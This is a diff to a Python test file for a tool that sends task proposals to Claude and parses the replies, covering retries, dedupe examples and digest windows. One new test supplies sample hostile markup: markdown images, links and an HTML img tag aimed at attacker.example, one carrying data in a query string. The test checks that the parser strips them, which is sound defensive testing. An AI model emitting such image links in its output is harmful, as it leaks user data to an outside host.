@@ -475,7 +475,7 @@ def test_dry_run_payload_carries_no_held_content(tmp_cfg: Config, tmp_path: Path
     result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
     blob = json.dumps(result)
     assert "zebra" not in blob and CANARY not in blob and "Rotate the thing" not in blob
-    assert result["items"] == {"gated": 6, "held": 3, "to_claude": 3, "negative_examples": 0}
+    assert result["items"] == {"gated": 6, "held": 3, "to_claude": 3, "negative_examples": 0, "open_examples": 0}
     assert {h["id"] for h in result["held"]} == {"t-term", "t-tag", "t-path"}
     assert all(set(h) == {"id", "kind", "reason", "hold_kind"} for h in result["held"]), "references by id only"
 
@@ -519,8 +519,10 @@ def test_the_last_twenty_rejected_proposals_are_in_the_payload_as_negative_examp
         assert f"Rejected work {n:02d}" in payload and f"reason-{n:02d}" in payload
     for n in range(0, 5):
         assert f"Rejected work {n:02d}" not in payload
-    assert "Still proposed" not in payload and "Already confirmed" not in payload
-    assert result["items"]["negative_examples"] == 20 and result["items"]["to_claude"] == 23
+    # the live proposals are shown too, under their own prefix and counter (the dedupe examples)
+    assert "Still proposed" in payload and "Already confirmed" in payload
+    assert result["items"]["negative_examples"] == 20 and result["items"]["open_examples"] == 2
+    assert result["items"]["to_claude"] == 25
     assert NEGATIVE_PREFIX in payload
     assert "rejected earlier" in result["header"]
 
@@ -570,6 +572,9 @@ def test_a_run_writes_one_file_per_proposal_and_audits_it(tmp_cfg: Config, tmp_p
     assert len(call) == 1 and call[0]["job_id"] == job.id and call[0]["proposals"] == 2
     created = rig.events("proposal_created")
     assert sorted(e["proposal_id"] for e in created) == sorted(p.id for p in stored)
+    # the digest id has its own key: `run_id` is the audit envelope's process run id and must not be overwritten
+    assert all(e["digest_run_id"] == f"digest-{rig.day.isoformat()}" and e["run_id"] != e["digest_run_id"]
+               for e in created)
     audit_text = rig.audit.path.read_text(encoding="utf-8")
     assert "Reply to the open thread" not in audit_text and "Synthetic reason" not in audit_text, "ids and counts only"
 
@@ -1058,3 +1063,112 @@ def test_the_new_commands_are_registered() -> None:
     assert parser.parse_args(["propose", "--dry-run", "--force"]).dry_run is True
     assert parser.parse_args(["proposals", "--all"]).all is True
     assert {"propose", "proposals"} <= set(cli.HANDLERS)
+
+
+# --- release 1.2.0: markup, near duplicates, a retry that must not undo a decision, the window ----------------------------
+
+
+def test_parse_neutralizes_markdown_links_images_and_long_html(tmp_cfg: Config) -> None:
+    hostile = ("See ![x](https://attacker.example/p?d=abc) and [read](https://attacker.example/q) now "
+               '<img src="https://attacker.example/' + "z" * 120 + '">')
+    out = parse_proposals(reply(draft("Fix ![t](https://attacker.example/t) it", rationale=hostile)), IDS, tmp_cfg, 8)
+    only = out.proposals[0]
+    assert "attacker.example" not in only.title + only.rationale
+    assert "![" not in only.rationale and "](" not in only.rationale and "<img" not in only.rationale
+    assert only.title.startswith("Fix") and "read" in only.rationale and "now" in only.rationale
+
+
+def test_live_proposals_are_shown_to_the_model_so_it_does_not_reword_them(
+        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
+    rig = build(tmp_cfg, tmp_path, tmp_vault)
+    plant_digest(rig)
+    save_proposal(rig.dir, proposal(1, title="Exercise the kill switch", status="proposed"))
+    save_proposal(rig.dir, proposal(2, title="Already shipped work", status="confirmed",
+                                    tracker_ref="https://tracker.example/t/1"))
+    save_proposal(rig.dir, proposal(3, title="Edited work", status="edited_confirmed",
+                                    tracker_ref="https://tracker.example/t/2", edits={"title": "Edited by the owner"}))
+    save_proposal(rig.dir, proposal(4, title="Rejected work", status="rejected", rejected_reason="no"))
+    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
+    payload = result["payload"]
+    assert "open-p-00000001" in payload and "Exercise the kill switch" in payload
+    assert "Already shipped work" in payload and "Edited by the owner" in payload
+    assert result["items"]["open_examples"] == 3 and result["items"]["negative_examples"] == 1
+    assert "already open" in result["header"]
+    assert "never cite" in propose.SYSTEM_PROMPT and "open-" in propose.SYSTEM_PROMPT
+
+
+def test_at_most_thirty_live_proposals_are_shown_newest_first(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
+    rig = build(tmp_cfg, tmp_path, tmp_vault)
+    plant_digest(rig)
+    for n in range(1, 36):
+        save_proposal(rig.dir, proposal(n, title=f"Standing work {n:02d}", status="proposed"))
+    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
+    assert result["items"]["open_examples"] == 30
+    assert "Standing work 35" in result["payload"] and "Standing work 06" in result["payload"]
+    assert "Standing work 05" not in result["payload"]
+
+
+def test_a_live_proposal_is_not_evidence(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
+    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="echo_open")
+    save_proposal(rig.dir, proposal(1, title="Exercise the kill switch", status="proposed"))
+    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
+    assert result["proposals"] == 0 and result["dropped"]["ungrounded"] == 1
+
+
+def test_open_examples_alone_are_not_something_to_propose_from(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
+    rig = ready(tmp_cfg, tmp_path, tmp_vault, items=[])
+    save_proposal(rig.dir, proposal(1, title="Exercise the kill switch", status="proposed"))
+    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
+    assert result["status"] == "no_items" and rig.runner.paid() == []
+
+
+def test_a_retried_job_never_overwrites_a_proposal_the_owner_already_decided(
+        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
+    rig = ready(tmp_cfg, tmp_path, tmp_vault)
+    job = new_job(rig)
+    first = run_propose_job(job, rig.deps, mode="daemon")
+    target = next(p for p in rig.stored() if p.title == "Reply to the open thread")
+    assert target.id in first["ids"]
+    save_proposal(rig.dir, target.model_copy(update={"status": "rejected", "rejected_reason": "not for me"}))
+    manifest = propose.latest_digest_manifest(rig.state.dir)
+    assert manifest is not None
+    again = propose.ParsedProposals([propose.Draft("Reply to the open thread", "synthetic-project", "task",
+                                                   ["t-open-1"], "to do", None, "Synthetic reason.")])
+    run = propose._Run(job=job, deps=rig.deps, mode="daemon", now=rig.clock.now)
+    result = propose._write(run, manifest, again, "sha", gated=3, held=0, to_claude=3, negatives=0)
+    kept = next(p for p in rig.stored() if p.id == target.id)
+    assert kept.status == "rejected" and kept.rejected_reason == "not for me"
+    assert len(rig.events("proposal_created")) == 2, "no second proposal_created for the same id"
+    assert target.id in result["ids"], "the job still reports the proposal it made"
+
+
+def test_a_retry_after_a_busy_save_keeps_the_first_attempts_proposal_and_adds_the_rest(
+        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
+    rig = ready(tmp_cfg, tmp_path, tmp_vault)
+    job = new_job(rig)
+    run_propose_job(job, rig.deps, mode="daemon")
+    before = {p.id: p.model_dump_json() for p in rig.stored()}
+    manifest = propose.latest_digest_manifest(rig.state.dir)
+    assert manifest is not None
+    drafts = propose.ParsedProposals([
+        propose.Draft("Reply to the open thread", "synthetic-project", "task", ["t-open-1"], "to do", None, "Synthetic reason."),
+        propose.Draft("A brand new idea", "synthetic-project", "task", ["t-open-2"], "to do", None, "Fresh.")])
+    propose._write(propose._Run(job=job, deps=rig.deps, mode="daemon", now=rig.clock.now), manifest, drafts, "sha",
+                   gated=3, held=0, to_claude=3, negatives=0)
+    after = {p.id: p.model_dump_json() for p in rig.stored()}
+    assert len(after) == 3 and all(after[k] == v for k, v in before.items())
+
+
+def test_the_window_is_never_narrower_than_the_default_even_after_a_forced_digest_rerun(
+        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
+    rig = ready(tmp_cfg, tmp_path, tmp_vault)
+    end = rig.clock.now - timedelta(minutes=20)
+    job = new_job(rig, dry_run=True)
+    job.window = JobWindow(start=iso(end - timedelta(minutes=13)), end=iso(end))  # a rerun starts at the watermark
+    result = run_propose_job(job, rig.deps, mode="manual")
+    default = timedelta(hours=rig.cfg.digest.window_hours_default)
+    assert f"Window: {iso(end - default)} to {iso(end)}." in result["header"]
+    wide = new_job(rig, dry_run=True, suffix="-wide")
+    wide.window = JobWindow(start=iso(end - timedelta(hours=60)), end=iso(end))
+    again = run_propose_job(wide, rig.deps, mode="manual")
+    assert f"Window: {iso(end - timedelta(hours=60))} to {iso(end)}." in again["header"], "a wider window is kept"
